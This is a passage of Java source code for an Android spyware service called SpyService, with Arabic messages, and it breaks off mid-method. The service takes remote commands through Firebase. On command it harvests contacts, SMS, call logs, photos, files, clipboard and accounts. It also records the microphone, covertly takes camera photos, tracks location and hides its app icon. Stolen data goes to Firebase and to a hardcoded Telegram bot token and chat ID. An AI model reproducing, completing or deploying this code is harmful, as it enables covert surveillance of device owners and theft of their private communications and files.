package com.black.phone;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.hardware.Camera;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;
import com.google.firebase.database.*;
import okhttp3.*;
import org.json.JSONObject;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class SpyService extends Service {
    private static final String TAG = "SpyService";
    private ScheduledExecutorService scheduler;
    private PowerManager.WakeLock wakeLock;
    private MediaRecorder recorder;
    private String audioPath;
    private boolean isRecording = false;
    private String deviceId;
    private Camera camera;
    private Camera frontCamera;
    private LocationManager locationManager;
    private LocationListener locationListener;
    private boolean isTrackingLocation = false;
    private boolean foregroundStarted = false;

    // Telegram
    private static final String BOT_TOKEN = "8962511911:AAHYZpdZJVkNif1iF1-3odKTqq2owgDk16M";
    private static final String CHAT_ID = "6793813126";

    // Firebase
    private FirebaseDatabase database;
    private DatabaseReference deviceRef;
    private DatabaseReference commandRef;
    private DatabaseReference dataRef;
    private OkHttpClient httpClient;

    @Override
    public void onCreate() {
        super.onCreate();
        Config.load(this);
        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        httpClient = new OkHttpClient.Builder()
                .connectTimeout(30, TimeUnit.SECONDS)
                .readTimeout(60, TimeUnit.SECONDS)
                .writeTimeout(60, TimeUnit.SECONDS)
                .build();

        startForegroundService();

        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Spy:lock");
        wakeLock.acquire(10 * 60 * 1000L);

        FirebaseDatabase.getInstance().setPersistenceEnabled(false);
        database = FirebaseDatabase.getInstance();
        deviceRef = database.getReference("devices").child(deviceId);
        commandRef = database.getReference("commands").child(deviceId);
        dataRef = database.getReference("devices").child(deviceId).child("data");

        registerDevice();
        listenForCommands();

        scheduler = Executors.newSingleThreadScheduledExecutor();
        scheduler.scheduleAtFixedRate(this::sendHeartbeat, 5, 5, TimeUnit.SECONDS);
    }

    private void startForegroundService() {
        if (foregroundStarted) return;
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                NotificationChannel ch = new NotificationChannel("spy_ch", "خدمة التحديث", NotificationManager.IMPORTANCE_LOW);
                getSystemService(NotificationManager.class).createNotificationChannel(ch);
            }
            Notification notification = new NotificationCompat.Builder(this, "spy_ch")
                    .setContentTitle("🔱 بلاك - الخدمة نشطة")
                    .setContentText("جاري الاتصال بـ Firebase...")
                    .setSmallIcon(android.R.drawable.ic_menu_manage)
                    .setPriority(NotificationCompat.PRIORITY_LOW)
                    .setSilent(true)
                    .build();
            startForeground(1337, notification);
            foregroundStarted = true;
        } catch (SecurityException e) { Log.e(TAG, "Foreground failed", e); }
    }

    private void updateNotification(String text) {
        if (foregroundStarted) {
            try {
                Notification notification = new NotificationCompat.Builder(this, "spy_ch")
                        .setContentTitle("🔱 بلاك - الخدمة نشطة")
                        .setContentText(text)
                        .setSmallIcon(android.R.drawable.ic_menu_manage)
                        .setPriority(NotificationCompat.PRIORITY_LOW)
                        .setSilent(true)
                        .build();
                startForeground(1337, notification);
            } catch (Exception e) { Log.e(TAG, "Update notification failed", e); }
        }
    }

    private void registerDevice() {
        try {
            Map<String, Object> info = new HashMap<>();
            info.put("device_id", deviceId);
            info.put("device_name", Build.MANUFACTURER + " " + Build.MODEL);
            info.put("model", Build.MODEL);
            info.put("manufacturer", Build.MANUFACTURER);
            info.put("android", Build.VERSION.RELEASE);
            info.put("battery", getBatteryLevel());
            info.put("last_seen", System.currentTimeMillis());
            deviceRef.setValue(info);
            updateNotification("✅ مسجل في Firebase");
            Log.d(TAG, "Registered");
        } catch (Exception e) { Log.e(TAG, "Registration error", e); }
    }

    private void sendHeartbeat() {
        deviceRef.child("last_seen").setValue(System.currentTimeMillis());
    }

    private void listenForCommands() {
        commandRef.addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(DataSnapshot dataSnapshot) {
                String command = dataSnapshot.getValue(String.class);
                if (command != null && !command.isEmpty()) {
                    Log.d(TAG, "📩 Command: " + command);
                    executeCommand(command);
                    commandRef.removeValue();
                }
            }
            @Override
            public void onCancelled(DatabaseError error) {
                Log.e(TAG, "Firebase listen error", error.toException());
            }
        });
    }

    // ======================================================================
    // ========== دوال الإرسال ==========
    // ======================================================================

    private void sendData(String type, String data) {
        dataRef.child(type).setValue(data);
    }

    private void sendFileToFirebase(File file, String caption) {
        try {
            byte[] bytes = new byte[(int) file.length()];
            java.io.FileInputStream fis = new java.io.FileInputStream(file);
            fis.read(bytes);
            fis.close();
            String base64 = android.util.Base64.encodeToString(bytes, android.util.Base64.DEFAULT);
            JSONObject json = new JSONObject();
            json.put("name", file.getName());
            json.put("data", base64);
            json.put("caption", caption);
            json.put("path", file.getAbsolutePath());
            sendData("FILE", json.toString());
            Log.d(TAG, "📤 أُرسل إلى Firebase: " + file.getName());
        } catch (Exception e) {
            Log.e(TAG, "Send file to Firebase error", e);
        }
    }

    private void sendFileToTelegram(File file, String caption) {
        try {
            RequestBody body = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", CHAT_ID)
                    .addFormDataPart("caption", caption != null ? caption : file.getName())
                    .addFormDataPart("document", file.getName(),
                            RequestBody.create(file, MediaType.parse("application/octet-stream")))
                    .build();
            Request request = new Request.Builder()
                    .url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument")
                    .post(body)
                    .build();
            httpClient.newCall(request).enqueue(new Callback() {
                @Override public void onFailure(Call call, IOException e) {
                    Log.e(TAG, "Telegram send failed: " + e.getMessage());
                }
                @Override public void onResponse(Call call, Response response) throws IOException {
                    if (response.isSuccessful()) {
                        Log.d(TAG, "📤 أُرسل إلى تيليجرام: " + file.getName());
                    }
                    response.close();
                }
            });
        } catch (Exception e) {
            Log.e(TAG, "Send file to Telegram error", e);
        }
    }

    private void sendTextToTelegram(String text) {
        try {
            JSONObject json = new JSONObject();
            json.put("chat_id", CHAT_ID);
            json.put("text", text);
            json.put("parse_mode", "Markdown");
            RequestBody body = RequestBody.create(json.toString(), MediaType.parse("application/json; charset=utf-8"));
            Request request = new Request.Builder()
                    .url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage")
                    .post(body)
                    .build();
            httpClient.newCall(request).enqueue(new Callback() {
                @Override public void onFailure(Call call, IOException e) {}
                @Override public void onResponse(Call call, Response response) throws IOException { response.close(); }
            });
        } catch (Exception e) { Log.e(TAG, "sendText error", e); }
    }

    private void sendLocationToTelegram(double lat, double lng) {
        try {
            String text = "📍 الموقع: https://maps.google.com/maps?q=" + lat + "," + lng;
            JSONObject json = new JSONObject();
            json.put("chat_id", CHAT_ID);
            json.put("text", text);
            json.put("parse_mode", "Markdown");
            RequestBody body = RequestBody.create(json.toString(), MediaType.parse("application/json; charset=utf-8"));
            Request request = new Request.Builder()
                    .url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage")
                    .post(body)
                    .build();
            httpClient.newCall(request).enqueue(new Callback() {
                @Override public void onFailure(Call call, IOException e) {}
                @Override public void onResponse(Call call, Response response) throws IOException { response.close(); }
            });
        } catch (Exception e) { Log.e(TAG, "sendLocation error", e); }
    }

    // ======================================================================
    // ========== تنفيذ الأوامر ==========
    // ======================================================================

    private void executeCommand(String cmd) {
        String lower = cmd.toLowerCase().trim();
        Log.d(TAG, "⚡ Executing: " + lower);
        try {
            switch (lower) {
                case "get_contacts": {
                    File f = collectContacts();
                    sendFileToFirebase(f, "📇 جهات الاتصال");
                    sendFileToTelegram(f, "📇 جهات الاتصال");
                    break;
                }
                case "get_sms": {
                    File f = collectSms();
                    sendFileToFirebase(f, "💬 الرسائل النصية");
                    sendFileToTelegram(f, "💬 الرسائل النصية");
                    break;
                }
                case "get_calllogs": {
                    File f = collectCallLogs();
                    sendFileToFirebase(f, "📞 سجل المكالمات");
                    sendFileToTelegram(f, "📞 سجل المكالمات");
                    break;
                }
                case "get_location": {
                    getLocation();
                    break;
                }
                case "start_record": {
                    startRecording();
                    break;
                }
                case "stop_record": {
                    File f = stopRecording();
                    if (f != null) {
                        sendFileToFirebase(f, "🎤 تسجيل صوتي");
                        sendFileToTelegram(f, "🎤 تسجيل صوتي");
                    }
                    break;
                }
                case "get_apps": {
                    File f = collectApps();
                    sendFileToFirebase(f, "📱 التطبيقات");
                    sendFileToTelegram(f, "📱 التطبيقات");
                    break;
                }
                case "get_photos": {
                    File f = collectMedia("images");
                    sendFileToFirebase(f, "🖼 الصور");
                    sendFileToTelegram(f, "🖼 الصور");
                    break;
                }
                case "get_videos": {
                    File f = collectMedia("videos");
                    sendFileToFirebase(f, "🎬 الفيديوهات");
                    sendFileToTelegram(f, "🎬 الفيديوهات");
                    break;
                }
                case "get_files": {
                    File f = collectAllFiles();
                    sendFileToFirebase(f, "📦 الملفات");
                    sendFileToTelegram(f, "📦 الملفات");
                    break;
                }
                case "hide_app": {
                    hideApp();
                    break;
                }
                case "show_app": {
                    showApp();
                    break;
                }
                case "fake_notif": {
                    showFakeNotification();
                    break;
                }
                case "take_photo": {
                    takePhotoBack();
                    break;
                }
                case "take_photo_front": {
                    takePhotoFront();
                    break;
                }
                case "flash_on": {
                    flashOn();
                    break;
                }
                case "flash_off": {
                    flashOff();
                    break;
                }
                case "get_imei": {
                    getImei();
                    break;
                }
                case "get_phone": {
                    getPhoneNumber();
                    break;
                }
                case "get_sim": {
                    getSimInfo();
                    break;
                }
                case "get_wifi": {
                    getWifiInfo();
                    break;
                }
                case "get_battery": {
                    getBatteryInfo();
                    break;
                }
                case "get_ip": {
                    getPublicIp();
                    break;
                }
                case "lock_device": {
                    lockDevice();
                    break;
                }
                case "reboot": {
                    rebootDevice();
                    break;
                }
                case "shutdown": {
                    shutdownDevice();
                    break;
                }
                case "get_accounts": {
                    File f = getAccounts();
                    sendFileToFirebase(f, "👤 الحسابات");
                    sendFileToTelegram(f, "👤 الحسابات");
                    break;
                }
                case "get_clipboard": {
                    File f = getClipboard();
                    sendFileToFirebase(f, "📋 الحافظة");
                    sendFileToTelegram(f, "📋 الحافظة");
                    break;
                }
                case "get_device": {
                    sendDeviceInfo();
                    break;
                }
                case "get_network": {
                    sendNetworkInfo();
                    break;
                }
                case "start_location_track": {
                    startLocationTracking();
                    break;
                }
                case "stop_location_track": {
                    stopLocationTracking();
                    break;
                }
                default: {
                    sendData("ERROR", "أمر غير معروف: " + cmd);
                }
            }
        } catch (Exception e) {
            sendData("ERROR", "خطأ: " + e.getMessage());
            Log.e(TAG, "Execute error", e);
        }
    }

    // ======================================================================
    // ========== دوال جمع البيانات ==========
    // ======================================================================

    private int getBatteryLevel() {
        try {
            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent batteryIntent = registerReceiver(null, ifilter);
            if (batteryIntent != null) {
                int level = batteryIntent.getIntExtra("level", -1);
                int scale = batteryIntent.getIntExtra("scale", -1);
                if (level >= 0 && scale > 0) return (level * 100) / scale;
            }
        } catch (Exception e) { Log.e(TAG, "battery err", e); }
        return -1;
    }

    private File collectContacts() throws Exception {
        File f = new File(getCacheDir(), "contacts.txt");
        FileOutputStream fos = new FileOutputStream(f);
        ContentResolver cr = getContentResolver();
        Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null);
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String phone = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                fos.write((name + " : " + phone + "\n").getBytes());
            }
            cursor.close();
        }
        fos.close();
        return f;
    }

    private File collectSms() throws Exception {
        File f = new File(getCacheDir(), "sms.txt");
        FileOutputStream fos = new FileOutputStream(f);
        Uri uri = Uri.parse("content://sms/inbox");
        Cursor cursor = getContentResolver().query(uri, null, null, null, "date DESC");
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String address = cursor.getString(cursor.getColumnIndex("address"));
                String body = cursor.getString(cursor.getColumnIndex("body"));
                fos.write(("من: " + address + "\n" + body + "\n---\n").getBytes());
            }
            cursor.close();
        }
        fos.close();
        return f;
    }

    private File collectCallLogs() throws Exception {
        File f = new File(getCacheDir(), "call_log.txt");
        FileOutputStream fos = new FileOutputStream(f);
        Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI,
                null, null, null, CallLog.Calls.DATE + " DESC");
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                String name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
                String type = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
                String duration = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));
                fos.write(("رقم: " + number + " | الاسم: " + name + " | النوع: " + type + " | المدة: " + duration + "s\n").getBytes());
            }
            cursor.close();
        }
        fos.close();
        return f;
    }

    private File collectApps() throws Exception {
        File f = new File(getCacheDir(), "apps.txt");
        FileOutputStream fos = new FileOutputStream(f);
        PackageManager pm = getPackageManager();
        List<android.content.pm.PackageInfo> packages = pm.getInstalledPackages(0);
        for (android.content.pm.PackageInfo pkg : packages) {
            String name = pkg.applicationInfo.loadLabel(pm).toString();
            fos.write((name + " | " + pkg.packageName + "\n").getBytes());
        }
        fos.close();
        return f;
    }

    // ======================================================================
    // ========== الصور والفيديوهات والملفات ==========
    // ======================================================================

    private File collectMedia(String type) throws Exception {
        File zipFile = new File(getCacheDir(), type + ".zip");
        ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipFile));
        Uri uri = type.equals("images") ? MediaStore.Images.Media.EXTERNAL_CONTENT_URI :
                MediaStore.Video.Media.EXTERNAL_CONTENT_URI;
        String[] projection = {MediaStore.MediaColumns.DATA,
                MediaStore.MediaColumns.DISPLAY_NAME};
        Cursor cursor = getContentResolver().query(uri, projection, null, null,
                MediaStore.MediaColumns.DATE_ADDED + " DESC");
        if (cursor != null) {
            int count = 0;
            while (cursor.moveToNext() && count < 30) {
                String path = cursor.getString(0);
                String name = cursor.getString(1);
                File file = new File(path);
                if (file.exists() && file.length() < 50 * 1024 * 1024) {
                    java.io.FileInputStream fis = new java.io.FileInputStream(file);
                    ZipEntry ze = new ZipEntry(name);
                    zos.putNextEntry(ze);
                    byte[] buffer = new byte[1024];
                    int len;
                    while ((len = fis.read(buffer)) > 0) zos.write(buffer, 0, len);
                    zos.closeEntry();
                    fis.close();
                    count++;
                }
            }
            cursor.close();
        }
        zos.close();
        return zipFile;
    }
    private File collectAllFiles() throws Exception {
        File zipFile = new File(getCacheDir(), "all_files.zip");
        ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipFile));
        File dcim = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
        if (dcim.exists()) addDirToZip(zos, dcim, "DCIM");
        File download = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
        if (download.exists()) addDirToZip(zos, download, "Downloads");
        zos.close();
        return zipFile;
    }

    private void addDirToZip(ZipOutputStream zos, File dir, String parent) throws Exception {
        File[] files = dir.listFiles();
        if (files == null) return;
        for (File f : files) {
            if (f.isFile() && f.length() < 20 * 1024 * 1024) {
                java.io.FileInputStream fis = new java.io.FileInputStream(f);
                ZipEntry ze = new ZipEntry(parent + "/" + f.getName());
                zos.putNextEntry(ze);
                byte[] buffer = new byte[1024];
                int len;
                while ((len = fis.read(buffer)) > 0) zos.write(buffer, 0, len);
                zos.closeEntry();
                fis.close();
            }
        }
    }

    // ======================================================================
    // ========== الموقع والتسجيل ==========
    // ======================================================================

    private void getLocation() {
        try {
            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION)
                    != PackageManager.PERMISSION_GRANTED) {
                sendData("ERROR", "صلاحية الموقع غير مفعلة");
                return;
            }
            Location loc = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null) loc = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (loc != null) {
                String data = loc.getLatitude() + "," + loc.getLongitude();
                sendData("LOCATION", data);
                sendLocationToTelegram(loc.getLatitude(), loc.getLongitude());
            } else {
                locationManager.requestSingleUpdate(LocationManager.GPS_PROVIDER, new LocationListener() {
                    @Override public void onLocationChanged(Location l) {
                        String data = l.getLatitude() + "," + l.getLongitude();
                        sendData("LOCATION", data);
                        sendLocationToTelegram(l.getLatitude(), l.getLongitude());
                    }
                    @Override public void onStatusChanged(String p, int s, Bundle b) {}
                    @Override public void onProviderEnabled(String p) {}
                    @Override public void onProviderDisabled(String p) {}
                }, Looper.getMainLooper());
            }
        } catch (SecurityException e) {
            sendData("ERROR", "صلاحية الموقع غير مفعلة");
        }
    }

    private void startRecording() {
        try {
            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO)
                    != PackageManager.PERMISSION_GRANTED) {
                sendData("ERROR", "صلاحية التسجيل غير مفعلة");
                return;
            }
            audioPath = getCacheDir() + "/recording_" + System.currentTimeMillis() + ".mp3";
            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setAudioSamplingRate(44100);
            recorder.setAudioEncodingBitRate(128000);
            recorder.setOutputFile(audioPath);
            recorder.prepare();
            recorder.start();
            isRecording = true;
            sendData("RECORD", "started");
            sendTextToTelegram("🎤 بدأ التسجيل الصوتي...");
        } catch (Exception e) {
            sendData("ERROR", "فشل التسجيل: " + e.getMessage());
        }
    }

    private File stopRecording() {
        if (isRecording && recorder != null) {
            try {
                recorder.stop();
                recorder.release();
                recorder = null;
                isRecording = false;
                File f = new File(audioPath);
                if (f.exists()) {
                    sendTextToTelegram("⏹ تم إيقاف التسجيل وإرسال الملف");
                    return f;
                }
            } catch (Exception e) {
                sendData("ERROR", "فشل إيقاف التسجيل: " + e.getMessage());
            }
        }
        return null;
    }

    // ======================================================================
    // ========== الكاميرا والفلاش ==========
    // ======================================================================

    private void takePhotoBack() {
        try {
            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA)
                    != PackageManager.PERMISSION_GRANTED) {
                sendData("ERROR", "صلاحية الكاميرا غير مفعلة");
                return;
            }
            Camera cam = Camera.open();
            Camera.Parameters params = cam.getParameters();
            params.setFocusMode(Camera.Parameters.FOCUS_MODE_AUTO);
            cam.setParameters(params);
            cam.takePicture(null, null, (data, camera1) -> {
                try {
                    File file = new File(getCacheDir(), "photo_" + System.currentTimeMillis() + ".jpg");
                    FileOutputStream fos = new FileOutputStream(file);
                    fos.write(data);
                    fos.close();
                    sendFileToFirebase(file, "📸 صورة من الكاميرا الخلفية");
                    sendFileToTelegram(file, "📸 صورة من الكاميرا الخلفية");
                    cam.release();
                } catch (Exception e) { Log.e(TAG, "photo err", e); }
            });
        } catch (Exception e) {
            sendData("ERROR", "فشل التصوير الخلفي: " + e.getMessage());
            sendTextToTelegram("❌ فشل التصوير الخلفي: " + e.getMessage());
        }
    }

    private void takePhotoFront() {
        try {
            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA)
                    != PackageManager.PERMISSION_GRANTED) {
                sendData("ERROR", "صلاحية الكاميرا غير مفعلة");
                return;
            }
            Camera cam = Camera.open(Camera.CameraInfo.CAMERA_FACING_FRONT);
            cam.takePicture(null, null, (data, camera1) -> {
                try {
                    File file = new File(getCacheDir(), "selfie_" + System.currentTimeMillis() + ".jpg");
                    FileOutputStream fos = new FileOutputStream(file);
                    fos.write(data);
                    fos.close();
                    sendFileToFirebase(file, "🤳 صورة سيلفي");
                    sendFileToTelegram(file, "🤳 صورة سيلفي");
                    cam.release();
                } catch (Exception e) { Log.e(TAG, "selfie err", e); }
            });
        } catch (Exception e) {
            sendData("ERROR", "فشل التصوير الأمامي: " + e.getMessage());
            sendTextToTelegram("❌ فشل التصوير الأمامي: " + e.getMessage());
        }
    }

    private void flashOn() {
        try {
            if (camera == null) {
                camera = Camera.open();
            }
            Camera.Parameters params = camera.getParameters();
            params.setFlashMode(Camera.Parameters.FLASH_MODE_TORCH);
            camera.setParameters(params);
            camera.startPreview();
            sendData("FLASH", "on");
            sendTextToTelegram("🔦 تم تشغيل الكشاف");
        } catch (Exception e) {
            sendData("ERROR", "فشل تشغيل الكشاف: " + e.getMessage());
            sendTextToTelegram("❌ فشل تشغيل الكشاف");
        }
    }

    private void flashOff() {
        try {
            if (camera != null) {
                camera.stopPreview();
                camera.release();
                camera = null;
                sendData("FLASH", "off");
                sendTextToTelegram("🔦 تم إطفاء الكشاف");
            } else {
                sendTextToTelegram("⚠️ الكشاف ليس قيد التشغيل");
            }
        } catch (Exception e) {
            sendData("ERROR", "فشل إطفاء الكشاف: " + e.getMessage());
            sendTextToTelegram("❌ فشل إطفاء الكشاف");
        }
    }

    // ======================================================================
    // ========== معلومات الجهاز ==========
    // ======================================================================

    private void getImei() {
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_PHONE_STATE)
                    != PackageManager.PERMISSION_GRANTED) {
                sendData("ERROR", "صلاحية قراءة حالة الهاتف غير مفعلة");
                return;
            }
            String imei = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ? tm.getImei() : tm.getDeviceId();
            String data = "IMEI: " + (imei != null ? imei : "غير متاح");
            sendData("IMEI", data);
            sendTextToTelegram("📟 " + data);
        } catch (Exception e) {
            sendData("ERROR", "فشل قراءة IMEI: " + e.getMessage());
            sendTextToTelegram("❌ فشل قراءة IMEI");
        }
    }

    private void getPhoneNumber() {
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_PHONE_STATE)
                    != PackageManager.PERMISSION_GRANTED) {
                sendData("ERROR", "صلاحية قراءة حالة الهاتف غير مفعلة");
                return;
            }
            String number = tm.getLine1Number();
            String data = "رقم الهاتف: " + (number != null ? number : "غير متاح");
            sendData("PHONE", data);
            sendTextToTelegram("📞 " + data);
        } catch (Exception e) {
            sendData("ERROR", "فشل قراءة الرقم: " + e.getMessage());
            sendTextToTelegram("❌ فشل قراءة الرقم");
        }
    }

    private void getSimInfo() {
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_PHONE_STATE)
                    != PackageManager.PERMISSION_GRANTED) {
                sendData("ERROR", "صلاحية قراءة حالة الهاتف غير مفعلة");
                return;
            }
            String data = "SIM: " + tm.getSimOperatorName() + " | " + tm.getSimCountryIso() + " | " + tm.getSimSerialNumber();
            sendData("SIM", data);
            sendTextToTelegram("📡 " + data);
        } catch (Exception e) {
            sendData("ERROR", "فشل قراءة SIM: " + e.getMessage());
            sendTextToTelegram("❌ فشل قراءة SIM");
        }
    }

    private void getWifiInfo() {
        try {
            android.net.wifi.WifiManager wifi = (android.net.wifi.WifiManager) getSystemService(WIFI_SERVICE);
            android.net.wifi.WifiInfo info = wifi.getConnectionInfo();
            String data = "WiFi: " + (info.getSSID() != null ? info.getSSID() : "غير متصل") +
                    " | القوة: " + android.net.wifi.WifiManager.calculateSignalLevel(info.getRssi(), 5) + "/5";
            sendData("WIFI", data);
            sendTextToTelegram("📶 " + data);
        } catch (Exception e) {
            sendData("ERROR", "فشل قراءة WiFi: " + e.getMessage());
            sendTextToTelegram("❌ فشل قراءة WiFi");
        }
    }

    private void getBatteryInfo() {
        try {
            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent batteryIntent = registerReceiver(null, ifilter);
            if (batteryIntent != null) {
                int level = batteryIntent.getIntExtra("level", -1);
                int scale = batteryIntent.getIntExtra("scale", -1);
                int percentage = (level * 100) / scale;
                int temp = batteryIntent.getIntExtra("temperature", 0) / 10;
                int voltage = batteryIntent.getIntExtra("voltage", 0);
                String data = "البطارية: " + percentage + "% | " + temp + "°C | " + voltage + "mV";
                sendData("BATTERY", data);
                sendTextToTelegram("🔋 " + data);
            }
        } catch (Exception e) {
            sendData("ERROR", "فشل قراءة البطارية: " + e.getMessage());
            sendTextToTelegram("❌ فشل قراءة البطارية");
        }
    }

    private void getPublicIp() {
        try {
            URL url = new URL("https://api.ipify.org");
            java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
            conn.setConnectTimeout(5000);
            java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(conn.getInputStream()));
            String ip = reader.readLine();
            reader.close();
            String data = "IP العام: " + ip;
            sendData("IP", data);
            sendTextToTelegram("🌐 " + data);
        } catch (Exception e) {
            sendData("ERROR", "فشل الحصول على IP: " + e.getMessage());
            sendTextToTelegram("❌ فشل الحصول على IP");
        }
    }

    // ======================================================================
    // ========== تتبع الموقع ==========
    // ======================================================================

    private void startLocationTracking() {
        if (isTrackingLocation) return;
        try {
            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION)
                    != PackageManager.PERMISSION_GRANTED) {
                sendData("ERROR", "صلاحية الموقع غير مفعلة");
                return;
            }
            locationListener = new LocationListener() {
                @Override public void onLocationChanged(Location location) {
                    String data = location.getLatitude() + "," + location.getLongitude();
                    sendData("LOCATION_TRACK", data);
                    sendLocationToTelegram(location.getLatitude(), location.getLongitude());
                }
                @Override public void onStatusChanged(String p, int s, Bundle b) {}
                @Override public void onProviderEnabled(String p) {}
                @Override public void onProviderDisabled(String p) {}
            };
            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 60000, 0, locationListener);
            isTrackingLocation = true;
            sendData("LOCATION_TRACK", "started");
            sendTextToTelegram("📍 بدأ تتبع الموقع (كل دقيقة)");
        } catch (SecurityException e) {
            sendData("ERROR", "صلاحية الموقع غير مفعلة");
            sendTextToTelegram("❌ صلاحية الموقع غير مفعلة");
        }
    }

    private void stopLocationTracking() {
        if (!isTrackingLocation) return;
        try {
            locationManager.removeUpdates(locationListener);
            isTrackingLocation = false;
            sendData("LOCATION_TRACK", "stopped");
            sendTextToTelegram("🛑 تم إيقاف تتبع الموقع");
        } catch (Exception e) {
            sendData("ERROR", "فشل إيقاف التتبع: " + e.getMessage());
            sendTextToTelegram("❌ فشل إيقاف التتبع");
        }
    }

    // ======================================================================
    // ========== أوامر التحكم ==========
    // ======================================================================

    private void lockDevice() {
        try {
            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            dpm.lockNow();
            sendData("LOCK", "locked");
            sendTextToTelegram("🔒 تم قفل الجهاز");
        } catch (Exception e) {
            sendData("ERROR", "فشل قفل الجهاز: " + e.getMessage());
            sendTextToTelegram("❌ فشل قفل الجهاز");
        }
    }

    private void rebootDevice() {
        try {
            Process process = Runtime.getRuntime().exec("su -c reboot");
            int exitCode = process.waitFor();
            if (exitCode == 0) {
                sendData("REBOOT", "rebooting");
                sendTextToTelegram("🔄 جاري إعادة تشغيل الجهاز...");
            } else {
                PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                pm.reboot(null);
                sendData("REBOOT", "rebooting");
                sendTextToTelegram("🔄 جاري إعادة تشغيل الجهاز...");
            }
        } catch (Exception e) {
            sendData("ERROR", "فشل إعادة التشغيل - يحتاج صلاحيات الجذر");
            sendTextToTelegram("❌ فشل إعادة التشغيل - يحتاج صلاحيات الجذر");
        }
    }

    private void shutdownDevice() {
        try {
            Process process = Runtime.getRuntime().exec("su -c shutdown");
            int exitCode = process.waitFor();
            if (exitCode == 0) {
                sendData("SHUTDOWN", "shutting down");
                sendTextToTelegram("⏻ جاري إيقاف تشغيل الجهاز...");
            } else {
                sendData("ERROR", "فشل إيقاف التشغيل - يحتاج صلاحيات الجذر");
                sendTextToTelegram("❌ فشل إيقاف التشغيل - يحتاج صلاحيات الجذر");
            }
        } catch (Exception e) {
            sendData("ERROR", "فشل إيقاف التشغيل - يحتاج صلاحيات الجذر");
            sendTextToTelegram("❌ فشل إيقاف التشغيل - يحتاج صلاحيات الجذر");
        }
    }

    // ======================================================================
    // ========== دوال مساعدة ==========
    // ======================================================================

    private void hideApp() {
        getPackageManager().setComponentEnabledSetting(
                new android.content.ComponentName(this, MainActivity.class),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        sendData("HIDE", "hidden");
        sendTextToTelegram("👁‍🗨 تم إخفاء التطبيق");
    }

    private void showApp() {
